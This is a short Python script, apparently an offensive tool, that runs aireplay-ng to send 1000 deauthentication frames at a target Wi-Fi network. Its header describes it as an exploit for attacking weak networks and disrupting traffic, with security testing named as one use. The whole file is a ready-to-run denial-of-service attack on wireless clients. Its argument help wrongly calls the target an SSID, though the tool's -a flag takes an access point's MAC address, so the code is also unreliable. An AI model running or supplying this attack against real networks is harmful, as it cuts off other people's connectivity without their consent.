# -------------------------------------------
# Wi-Fi Packet Injection Using Aircrack-ng
# -------------------------------------------
# Functionality:
# - Injects custom packets into a target Wi-Fi network.
# - Used for attacking weak networks, disrupting traffic, or testing security.

# Devices being used:
# - Aircrack-ng: For packet injection into Wi-Fi networks.

# Example Usage:
# 1. Run the exploit to inject packets into the target Wi-Fi network:
#    python wifi_packet_injection.py --target <target_network>

import subprocess
import argparse

def inject_wifi_packets(target_network):
    """
    Injects custom packets into a target Wi-Fi network to exploit or test vulnerabilities.
    """
    print(f"[+] Injecting packets into Wi-Fi network: {target_network}...")
    subprocess.run(["aireplay-ng", "--deauth", "1000", "-a", target_network, "wlan0"])  # Perform deauthentication
    print("[✔] Packet injection completed.")

# Main function to handle user input and start packet injection
def main():
    parser = argparse.ArgumentParser(description="Wi-Fi Packet Injection using Aircrack-ng")
    parser.add_argument("--target", required=True, help="Target Wi-Fi network (SSID).")
    args = parser.parse_args()

    inject_wifi_packets(args.target)

# Run the exploit
if __name__ == "__main__":
    main()
